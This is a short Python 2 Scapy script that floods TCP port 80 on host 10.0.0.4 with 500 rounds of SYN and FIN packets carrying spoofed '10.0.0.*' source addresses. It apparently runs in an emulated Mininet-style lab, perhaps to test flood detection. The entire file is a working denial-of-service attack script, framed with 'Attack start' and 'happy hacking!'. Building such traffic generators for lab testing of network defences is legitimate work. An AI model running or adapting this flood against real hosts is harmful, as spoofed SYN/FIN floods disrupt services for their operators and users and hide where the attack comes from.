#!/usr/bin/env python

from scapy.all import *

def main():
	print "Attack start...\n"

	print "TCP attack...\n"
	for i in xrange(500):
		p1 = Ether(dst="00:00:00:00:00:04") / IP(dst="10.0.0.4", src="10.0.0.*") / TCP(dport=80, flags="S") / "attack"
		sendp(p1, iface="s1-eth1")
		p2 = Ether(dst="00:00:00:00:00:04") / IP(dst="10.0.0.4", src="10.0.0.*") / TCP(dport=80, flags="F") / "attack"
		sendp(p2, iface="s1-eth2")
	print "\nTCP attack stop.\n"

	print "Attack finished, happy hacking!"

if __name__ == '__main__':
	main()
